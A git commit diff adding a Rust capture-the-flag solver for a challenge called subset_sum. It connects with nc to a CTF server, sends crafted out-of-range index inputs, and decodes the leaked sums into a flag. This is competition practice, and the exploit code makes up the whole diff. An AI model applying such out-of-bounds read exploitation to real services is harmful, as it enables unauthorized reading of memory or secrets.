7f2dd6936bff3eb314c401f01902ca706fc411c4
zUnixorn <77864446+zUnixorn@users.noreply.github.com>
2023-10-20 15:47:17 +0200

    implement exploit for subset_sum

--- subset_sum/src/main.rs
+++ subset_sum/src/main.rs
@@ -1,44 +1,40 @@
-use std::io::{Read, Write};
+use std::io::Write;
 use std::process::{Command, Stdio};
-use std::str::FromStr;
 
 fn main() {
-	let mut proc = Command::new("./subset_sum_redacted").stdout(Stdio::piped()).stdin(Stdio::piped()).spawn().unwrap();
-	//let mut proc = Command::new("nc").args(["caroloctf.ias.tu-bs.de", "13374"]).stdout(Stdio::piped()).stdin(Stdio::piped()).spawn().unwrap();
-	let mut stdin = proc.stdin.as_mut().unwrap();
-	let out = proc.stdout.as_mut().unwrap();
+    let mut proc = Command::new("nc")
+        .args(["caroloctf.ias.tu-bs.de", "13374"])
+    // let mut proc = Command::new("./subset_sum_redacted")
+        .stdout(Stdio::piped())
+        .stdin(Stdio::piped())
+        .spawn().unwrap();
 
-	for i in 0..127 {
-		stdin.write_all(&nth(i)).unwrap();
-	}
-	stdin.write_all(b"3\n").unwrap();
-	let out = String::from_utf8(proc.wait_with_output().unwrap().stdout).unwrap();
+    let stdin = proc.stdin.as_mut().unwrap();
 
-	let mut counterweights = vec![0;127];
-	let nums = out.lines()
-		.filter(|line| line.contains("sum ="))
-		.map(|line| line.split("sum =").nth(1).unwrap().trim())
-		.map(|e|i64::from_str(e).unwrap())
-		.collect::<Vec<_>>();
-	println!("{:#?}", nums);
-	let parsed = nums.iter()
-		//.map(|num|(0..8).into_iter().map(move |i|(num >> (i * 8)) as u8 as char))
-		//.flatten()
-		//.enumerate().map(|(i, num)| format!("i: {} {num}", i))
-		.enumerate()
-		.map(|(i, e)|{
-			let mut sum_before: i64 = 0;
-			for e in &counterweights[0..i] {
-				sum_before = sum_before.wrapping_add(*e);
-			}
-			counterweights[i] = e.wrapping_add(sum_before);
-			e
-		})
-		.collect::<Vec<_>>();
-	//dbg!(&counterweights);
-	//dbg!(nums.into_iter().zip(counterweights.into_iter()).map(|(num, counterweight)|num.wrapping_sub(counterweight)).collect::<Vec<_>>());
-}
+    for i in -7..0 {
+        stdin.write_all(b"2\n").unwrap();
+        stdin.write_all(b"127\n").unwrap();
+        stdin.write_all(format!("{}\n", 128 + i).as_bytes()).unwrap();
+    }
 
-fn nth(i: usize) -> Vec<u8> {
-	format!("2\n127\n{i}\n").into_bytes()
+    stdin.write_all(b"3\n").unwrap();
+
+    let output = String::from_utf8(
+        proc.wait_with_output().unwrap().stdout
+    ).unwrap();
+
+    let sums = output.split(&[' ', '\n'])
+        .filter_map(|n| n.parse::<i64>().ok())
+        .collect::<Vec<_>>();
+
+    let mut flag = String::new();
+
+    for i in 1.. sums.len() {
+        let long = sums[i].overflowing_sub(sums[i - 1]).0;
+        let bytes = long.to_le_bytes();
+
+        flag.extend(bytes.iter().map(|v| *v as char));
+    }
+
+    println!("{}", flag);
 }
